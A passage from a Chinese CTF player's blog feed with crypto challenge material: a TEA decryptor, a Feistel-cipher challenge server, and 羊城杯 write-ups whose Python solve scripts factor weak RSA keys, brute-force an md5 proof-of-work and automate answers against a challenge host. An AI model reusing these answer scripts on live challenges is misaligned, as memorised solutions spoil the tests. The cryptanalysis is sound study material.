class="number">0</span>])</span><br><span class="line">    v1 = c_uint32(v[<span class="number">1</span>])</span><br><span class="line">    summ = c_uint32(<span class="number">0xC6EF3720</span>)</span><br><span class="line">    delta = <span class="number">0x9e3779b9</span></span><br><span class="line"></span><br><span class="line">    k0, k1, k2, k3 = c_uint32(k[<span class="number">0</span>]), c_uint32(k[<span class="number">1</span>]), c_uint32(k[<span class="number">2</span>]), c_uint32(k[<span class="number">3</span>])</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%#x %#x&quot;</span> % (v0.value, v1.value))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;%#x %#x %#x %#x&quot;</span> % (k0.value, k1.value, k2.value, k3.value))</span><br><span class="line"></span><br><span class="line">    w = [<span class="number">0</span>,<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>):</span><br><span class="line">        v1.value -= ((v0.value &lt;&lt; <span class="number">4</span>) + k2.value) ^ (v0.value + summ.value) ^ ((v0.value &gt;&gt; <span class="number">5</span>) + k3.value)</span><br><span class="line">        v0.value -= ((v1.value &lt;&lt; <span class="number">4</span>) + k0.value) ^ (v1.value + summ.value) ^ ((v1.value &gt;&gt; <span class="number">5</span>) + k1.value)</span><br><span class="line">        summ.value -= delta</span><br><span class="line">    w[<span class="number">0</span>], w[<span class="number">1</span>] = v0, v1</span><br><span class="line">    <span class="keyword">return</span> w</span><br></pre></td></tr></table></figure><h1 id="MyCipher"><a href="#MyCipher" class="headerlink" title="MyCipher"></a>MyCipher</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> SocketServer</span><br><span class="line"><span class="keyword">import</span> signal,os,random,string</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> sha256</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> struct <span class="keyword">import</span> pack, unpack</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Task</span>(<span class="params">SocketServer.BaseRequestHandler</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">proof_of_work</span>(<span class="params">self</span>):</span></span><br><span class="line">        random.seed(os.urandom(<span class="number">8</span>))</span><br><span class="line">        proof = <span class="string">&#x27;&#x27;</span>.join([random.choice(string.ascii_letters+string.digits) <span class="keyword">for</span> _ <span class="keyword">in</span> xrange(<span class="number">20</span>)])</span><br><span class="line">        digest = sha256(proof).hexdigest()</span><br><span class="line">        self.request.send(<span class="string">&quot;sha256(XXXX+%s) == %s\n&quot;</span> % (proof[<span class="number">4</span>:],digest))</span><br><span class="line">        self.request.send(<span class="string">&#x27;Give me XXXX:&#x27;</span>)</span><br><span class="line">        x = self.request.recv(<span class="number">10</span>)</span><br><span class="line">        x = x.strip()</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(x) != <span class="number">4</span> <span class="keyword">or</span> sha256(x+proof[<span class="number">4</span>:]).hexdigest() != digest: </span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dorecv</span>(<span class="params">self,sz</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">return</span> self.request.recv(sz).strip()</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dosend</span>(<span class="params">self, msg</span>):</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.request.sendall(msg)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">g</span>(<span class="params">self,v1,v2,x</span>):</span></span><br><span class="line">        value = (v1+v2+x)%<span class="number">256</span></span><br><span class="line">        value = ((value&lt;&lt;<span class="number">3</span>) | (value&gt;&gt;<span class="number">5</span>)) &amp;<span class="number">0xff</span></span><br><span class="line">        <span class="keyword">return</span> value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">self,value</span>):</span></span><br><span class="line">        v1,v2 = unpack(<span class="string">&#x27;&gt;2B&#x27;</span>,pack(<span class="string">&#x27;&gt;H&#x27;</span>,value))</span><br><span class="line">        v2 = self.g(v1,v2,<span class="number">1</span>)</span><br><span class="line">        v1 = self.g(v1,v2,<span class="number">0</span>)</span><br><span class="line">        value = unpack(<span class="string">&#x27;&gt;H&#x27;</span>,pack(<span class="string">&#x27;&gt;2B&#x27;</span>,v1,v2))</span><br><span class="line">        <span class="keyword">return</span> value[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt_ecb</span>(<span class="params">self,msg,key</span>):</span></span><br><span class="line">        l = <span class="built_in">len</span>(msg)</span><br><span class="line">        <span class="keyword">if</span> l%<span class="number">4</span> !=<span class="number">0</span>:</span><br><span class="line">            msg = msg+<span class="string">&#x27;\x00&#x27;</span>*(<span class="number">4</span>-(l%<span class="number">4</span>))</span><br><span class="line">        cipher = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(msg),<span class="number">4</span>):</span><br><span class="line">            cipher += self.encrypt(msg[i:i+<span class="number">4</span>],key)</span><br><span class="line">        <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">encrypt</span>(<span class="params">self,msg,key</span>):</span></span><br><span class="line">        subkeys = unpack(<span class="string">&#x27;&gt;4H&#x27;</span>,key)</span><br><span class="line">        left,right = unpack(<span class="string">&#x27;&gt;2H&#x27;</span>,msg)</span><br><span class="line">        right = right^subkeys[<span class="number">3</span>]</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">            tmp = left^self.f(subkeys[i]^right) </span><br><span class="line">            left = right</span><br><span class="line">            right = tmp</span><br><span class="line">        left = right^left</span><br><span class="line">        <span class="keyword">return</span> pack(<span class="string">&#x27;&gt;2H&#x27;</span>, left, right)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">handle</span>(<span class="params">self</span>):</span></span><br><span class="line">        signal.alarm(<span class="number">200</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.proof_of_work():</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        key = os.urandom(<span class="number">8</span>)</span><br><span class="line">        self.dosend(<span class="string">&#x27;Encrypted flag is:&#x27;</span>)</span><br><span class="line">        self.dosend(self.encrypt_ecb(flag,key)+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        self.dosend(<span class="string">&#x27;Here is your chance:&#x27;</span>)</span><br><span class="line">        data = self.dorecv(<span class="number">160</span>)</span><br><span class="line">        self.dosend(self.encrypt_ecb(data,key))</span><br><span class="line"></span><br><span class="line">        self.request.close()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">ForkingServer</span>(<span class="params">SocketServer.ForkingTCPServer, SocketServer.TCPServer</span>):</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    HOST, PORT = <span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">10005</span></span><br><span class="line">    server = ForkingServer((HOST, PORT), Task)</span><br><span class="line">    server.allow_reuse_address = <span class="literal">True</span></span><br><span class="line">    server.serve_forever()</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;p&gt;赛后问了别的师傅复盘一下，好的东西需要记录&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="http://sh1k4ku.github.io/categories/CTF/"/>
    
    
    <category term="randcrack" scheme="http://sh1k4ku.github.io/tags/randcrack/"/>
    
    <category term="coppersmith" scheme="http://sh1k4ku.github.io/tags/coppersmith/"/>
    
    <category term="Tea" scheme="http://sh1k4ku.github.io/tags/Tea/"/>
    
    <category term="Feistel" scheme="http://sh1k4ku.github.io/tags/Feistel/"/>
    
    <category term="Oracle" scheme="http://sh1k4ku.github.io/tags/Oracle/"/>
    
  </entry>
  
  <entry>
    <title>life</title>
    <link href="http://sh1k4ku.github.io/2021/09/20/2021/life/"/>
    <id>http://sh1k4ku.github.io/2021/09/20/2021/life/</id>
    <published>2021-09-20T15:29:54.000Z</published>
    <updated>2021-12-12T12:58:47.685Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="0fc0aaeed5c25102eb0d6fc6bd0f15e02a26e6ca202ff925e2564944776abb08">b9fd6817f5242136bb9b8b6622c6e49aa20d5400feebab590a553289a884555bfd36bf06d3adb75126cc1482d337ba8c270ad16680b1a58f8ff0635b813d10017d01396f0f3b9c43cde205bdfc60fde71017c6fc659c5292969dfeb98d0a56d47700edbaee4e375c23aedb099d3bb9c0783f0a3155c644a37dd054393de0a4d26cb4c30f5fd1f2148fef2d94980bf2902b9dc679b2e28104d453a81ae7652a5103c60c35615abfa930effb78cf01c54251997f9ea3ddca526e781adcaa7c15c4f4787a71388efd039653abe713f2e7289391d4a6090a22aa42d626a83c070ac99c77a3ffda3b9f838c67901b6b0224513af19e8d62fd65ece8627a54e397186b6554d3784d46fe902052769f7eadc578c8d28708af907b9683a9cf8bb4a52d9a8a4fdf0eed90f59563fb85e93cc760f76a12955a4f0bcdbc84ace492d153c7cc843e2760de29032137c3e8e6d8816c70885ec05bc3160ad4bfe2bd382ba9fa713bd0bb2fff40b0e46914e9c7b1465f83b7524f61806d16da14298420f27c73e712e56f26e98dc25f28bf7eb9bccbb62f5827049b4697605dd6e5b53b9a2cf42d088b5d772be9aea629b32febe5a6657ab13b16e98259a68717c1639b12ea0c0ec99cf2f758caf38dc2f541ceaaa18fdc0a1af806f8ce93945e93e947d9eda9a8fceea558f22cd50c3bfc6133145f6780315e00afd3d04fadda5c76a74e61c2c25073c9f564c06a109c8e0086cd7c168aca3b39efe2936e065ec5011544b1b93ac89446c9d127bf1b801db184d38b819d2c668529256f1a39b34fb74f439c5a98dbcd6e8f99bedc5c00f74a24beac1c0090af69e4003e4edde54973c99750235b7f925496f679bf5936226a21376b8b74cc4c8e872716e4c991fb75ff2c9026aa881c91b5a34ad672fdc302584f69e564b92bcf280b9d929203514e7187a04292c78c675c06d308351cb878cba5f358842a0e1377841175b85df0f5a0cfde55f8812bbc03bc6bbfe51f6e47b408e8c6de1a071625b03d28583f0ce972958d7624c4990e203be4af0193b897efe37544f73f6c04c25c10f8696675c1f48868c871c1d47616f0101e9aea4e8f45be3d7db23464842c7435371a1377c2a03bb6f54b80100459fb83f53a33d191549005ae3b73fa84756e1aa347e125a36f8354e16b5cec18961c8a633cbbf724d81afb1d23449add1249b7afe60a64a70de01be03a81d67699364bf83771d473a5fb67d031df7514f3df100b507266e145e421affa059261c56e0fabc2d607918f4e7e4a2ac23c358210de34e4a6f717b6ac342f2c9870dd49a6a521a34d14be3ff8a0939e6c4dbc64425bcbdcab6da2a2acfe9268f0d16dfb4c1fb6d055f5f86d0078839e62c6dbcf28f920cab0bf286d41d48d60e6f8753f32df0c694670ac5d025e1a0c2a41fbcff393f406da1cad533e76ae2b36ae7844b9f53a4685dde0381cbe52859d2158eb434b9fae6c544388b67ff3509b9b972bd393f1786345331bef3b0aa400afd2839134b8c14eb60e611822f8cb87bc572ff4b7180fa5d5d2faedd312c59d8ec57a131497d4ad18f843d84c3dd196af141c4cd2f2dc34bf4e921bd7b119d7780df0a23e65a299afe49690dadeb52cbf0a8f61c6c62fdc99c6bc722abe96989317d76d62422c9683593ea677a0f5bdb37c3b111bbce5db445458631f9dc5f2e6a2d6fc9483d145e3452117fee57098827b34b34adce3993fe7279858d7c71002109e6121496097c34b53c575669c021f9df61242f05f9d54d364325581c5bcb96a109a5b3a94007958340a61127d5d152faeddb4ebd9547d181d61bdeff72ccc6b55e37b3561360f8c43f4b4cfdc241dee776dfdd9cc890f645f6039250f6541b2f5172949d96d9a1121edab96318febaa5f39acbff14ce2e5e6ee6ecbd50fcb74eeae2701ed220399220a4abdb8d039cfc28daa40018494e74e490c15723a6af42415235aec589698c7cde02e0d1b87d84e59cffcbb8e1c2e9ecaae55210461e5be981d816620b5ab2057c1a5d9f8c1819521e48361a33c99c5eb7b4ee1858b8e49d3f464a9591750747274aac5c7bd3c4c62dfbe3cf4d71a90624f7a6b4c0c025ffe17d74458897171f3cf02e9db37bf5f15f1e6c2286385edf66f3a93e654fd65543bf60971d539e00dcbf04c1a39564ca119dc792608eff52bc9e4350e49fd630c10841fd3b4e7aaddf543ea7d5e2daaeec28fd2162e0805710e3055e2fe1f90252fdad0670a4aa33b6e9444a788b85517fa6ad04938fcddd10277f48720bbde801a429f1c86977e5e192dcd4b2b58ec20f5e612cfec7169e2a9ce81de021cb15d7ffeb47e80891ee3c03f5e74abe4de644c1359284e891baa9f7c6553f5a95abedcddf40acd1d95640bfc4d9c2fac92f83ee9218dd0f5a71245e72bc67b8c2978c0fe485e70079d7aff1f9c23a10728c83dbfe75da4af1e73f3fadcb7ac79990ea80841609a1d5adb5e473b011d4d7cf68b1d24874a97452e2a99c7497cddc14f79cf9842ce94553c7b244a15094ec1d43d9759a064aa26a36b31152d404defde568b2ac7f03a6b23515de394eb62b0e86425c17bb276754841dfe3d557e7f76796342d391e2fe262c478e16b0290d07ef3ebfb0c91e37ba272736a4ea94e51ee394ff2baa4716581ee15eb7c6f0b6d03218c8bf3265adc64a5f8c1610287c28f392e4ad3ce061deca1abdde3aacdc181ee6db94f741a91ccade78e32f458b8a167e94868d9b87bf7ccc25fef3bba772a6b4ce75cc86b3e9ca59ef29949bd502977d8e86af11b2fe96ef495530dc98f60786f9c343f197911fe73c628a1ae4aae181ea8bf11dd44864505d3f65f4805c9465c7966f64b42b6a4e5abb5257bc8643b8734509b8f8ae1a1701f9e9c46bad54b73e4270a7064580911c529b080d0c5e35adf1b12a977f8865eb3ca5f150913090d88f0eb497e66e9ea336ceee380a499bbd7e47db05d20f0eb92ed1a6a7d1929513df74c6fe2459a86e64d0438f9a05793056f49ef26ae4fe12dea7c23b66899d865bb77c24448baffd6</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">password</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">记录一些点滴，多半是负面情绪</summary>
    
    
    
    <category term="life" scheme="http://sh1k4ku.github.io/categories/life/"/>
    
    
  </entry>
  
  <entry>
    <title>羊城杯</title>
    <link href="http://sh1k4ku.github.io/2021/09/12/2021/%E7%BE%8A%E5%9F%8E%E6%9D%AF/"/>
    <id>http://sh1k4ku.github.io/2021/09/12/2021/%E7%BE%8A%E5%9F%8E%E6%9D%AF/</id>
    <published>2021-09-12T01:45:35.000Z</published>
    <updated>2021-09-13T10:03:45.079Z</updated>
    
    <content type="html"><![CDATA[<p>z做了五道。话说最后一题sm4之后是个什么玩意？</p><span id="more"></span><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Bigrsa"><a href="#Bigrsa" class="headerlink" title="Bigrsa"></a>Bigrsa</h2><p>签到题，模不互素，gcd求公共因子后就能分解了，之后就是最简单的RSA</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">n1=<span class="number">103835296409081751860770535514746586815395898427260334325680313648369132661057840680823295512236948953370895568419721331170834557812541468309298819497267746892814583806423027167382825479157951365823085639078738847647634406841331307035593810712914545347201619004253602692127370265833092082543067153606828049061</span></span><br><span class="line">n2=<span class="number">115383198584677147487556014336448310721853841168758012445634182814180314480501828927160071015197089456042472185850893847370481817325868824076245290735749717384769661698895000176441497242371873981353689607711146852891551491168528799814311992471449640014501858763495472267168224015665906627382490565507927272073</span></span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">p=gmpy2.gcd(n1,n2)</span><br><span class="line">q1=n1//p</span><br><span class="line">q2=n2//p</span><br><span class="line">phi1=(p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">phi2=(p-<span class="number">1</span>)*(q2-<span class="number">1</span>)</span><br><span class="line">c = <span class="number">60406168302768860804211220055708551816238816061772464557956985699400782163597251861675967909246187833328847989530950308053492202064477410641014045601986036822451416365957817685047102703301347664879870026582087365822433436251615243854347490600004857861059245403674349457345319269266645006969222744554974358264</span></span><br><span class="line">d1=gmpy2.invert(e,phi1)</span><br><span class="line">d2=gmpy2.invert(e,phi2)</span><br><span class="line">c=<span class="built_in">pow</span>(c,d2,n2)</span><br><span class="line">m=<span class="built_in">pow</span>(c,d1,n1)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Easy-RSA"><a href="#Easy-RSA" class="headerlink" title="Easy_RSA"></a>Easy_RSA</h2><p>根据生成可以知道p-1和q-1smooth，并且存在公共因子也就是2g，看书之后了解到这玩意叫Common prime RSA<img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF/image-20210912095325832.png" alt="image-20210912095325832"></p><p>因为这一题的n不大，所以a也不大，并且在模n有限域的情况下<script type="math/tex">x^n-1</script>最多就只有a个元素，那么可以考虑用Pollard rho算法分解n。其中f函数为<script type="math/tex">f(x)=x^{n-1}+3\;mod\;n</script>，首先随机生成一个数x1，x2可以由f(x1)生成，然后每轮x1执行一次f，x2执行两次f（提高效率）p=gcd(|x1-x2|,n)，当p不为1或n时可成功分解n。</p><p><img src="/images/%E7%BE%8A%E5%9F%8E%E6%9D%AF/image-20210912100142590.png" alt="image-20210912100142590"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span>(<span class="params">x, n</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(x, n - <span class="number">1</span>, n) + <span class="number">3</span>) % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_rho</span>(<span class="params">n</span>):</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x1 = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line">        x2 = f(x1, n)</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = GCD(<span class="built_in">abs</span>(x1 - x2), n)</span><br><span class="line">            <span class="keyword">if</span> p == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                x1 = f(x1, n)</span><br><span class="line">                x2 = f(f(x2, n), n)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">n = <span class="number">84236796025318186855187782611491334781897277899439717384242559751095347166978304126358295609924321812851255222430530001043539925782811895605398187299748256080526691975084042025794113521587064616352833904856626744098904922117855866813505228134381046907659080078950018430266048447119221001098505107823645953039</span></span><br><span class="line">e = <span class="number">58337</span></span><br><span class="line">c = <span class="number">13646200911032594651110040891135783560995665642049282201695300382255436792102048169200570930229947213493204600006876822744757042959653203573780257603577712302687497959686258542388622714078571068849217323703865310256200818493894194213812410547780002879351619924848073893321472704218227047519748394961963394668</span></span><br><span class="line"></span><br><span class="line">p,q=pollard_rho(n)</span><br><span class="line">phi=(p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d=gmpy2.invert(e,phi)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">pow</span>(c,d,n)))</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="RingRingRing"><a href="#RingRingRing" class="headerlink" title="RingRingRing"></a>RingRingRing</h2><p>nc后第一步是爆破md5，这里爆破了四位。</p><p>之后是要解一个方程：</p><script type="math/tex; mode=display">a^4+b^4+c^4+d^4=e^2</script><p>一开始以为是什么著名的曲线，查了一下没找到。突然想到这玩意没说abcd不能相等啊，相等时</p><script type="math/tex; mode=display">4x^4=e^2\\∴e=2x^2</script><p>嗯？？？这是什么意思，那传1—100不就可以了🐎？</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dehash</span>(<span class="params">s,re</span>):</span></span><br><span class="line">    alphabet = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(s,re)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> alphabet:</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> alphabet:</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> alphabet:</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> alphabet:</span><br><span class="line">                    ss=a+b+c+d+s</span><br><span class="line">                    <span class="keyword">if</span>  md5(ss.encode()).hexdigest().startswith(re):</span><br><span class="line">                        <span class="keyword">return</span> a+b+c+d</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    context.log_level=<span class="string">&quot;debug&quot;</span></span><br><span class="line">    p=remote(<span class="string">&#x27;192.168.41.60&#x27;</span>,<span class="number">2378</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;md5(str + &quot;</span>)</span><br><span class="line">    s= p.recvuntil(<span class="string">&quot;)[0:5] == &quot;</span>,drop=<span class="literal">True</span>)</span><br><span class="line">    hashre=p.recvline()[:-<span class="number">1</span>]</span><br><span class="line">    <span class="built_in">print</span>(s,hashre)</span><br><span class="line">    p.recvuntil(<span class="string">b&quot; Give me xxxxx:&quot;</span>)</span><br><span class="line">    p.sendline(dehash(s.decode(),hashre.decode()).encode())</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">101</span>):</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;a: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(i).encode())</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;b: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(i).encode())</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;c: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(i).encode())</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;d: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(i).encode())</span><br><span class="line">        p.recvuntil(<span class="string">b&quot;e: &quot;</span>)</span><br><span class="line">        p.sendline(<span class="built_in">str</span>(<span class="number">2</span>*i**<span class="number">2</span>).encode())</span><br><span class="line">    p.recvline()</span><br><span class="line">    p.recvline()</span><br><span class="line">main()</span><br></pre></td></tr></table></figure><h2 id="Rsa"><a href="#Rsa" class="headerlink" title="Rsa?"></a>Rsa?</h2><p>根据代码前面的生成有：</p><script type="math/tex; mode=display">M_y=flag,M_x=os.urandom(30)\\Z=M_xM_y\;mod \;n\\X=\frac{Z+\frac{1}{Z}}{2}\\Y=M_y\\a=\frac{\frac{1}{Z}-X}{Y},D=a^2</script><p>这题定义了一个新的运算模式：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">xy = <span class="keyword">lambda</span> (x1,y1),(x2,y2) : ((x1*x2+D*y1*y2)%n, (x1*y2+x2*y1)%n)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getloop</span>(<span class="params">(<span class="params">x,y</span>), e</span>):</span></span><br><span class="line">ret = (x, y)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(e-<span class="number">1</span>):</span><br><span class="line">ret = xy(ret, (x,y))</span><br><span class="line"><span class="keyword">return</span> 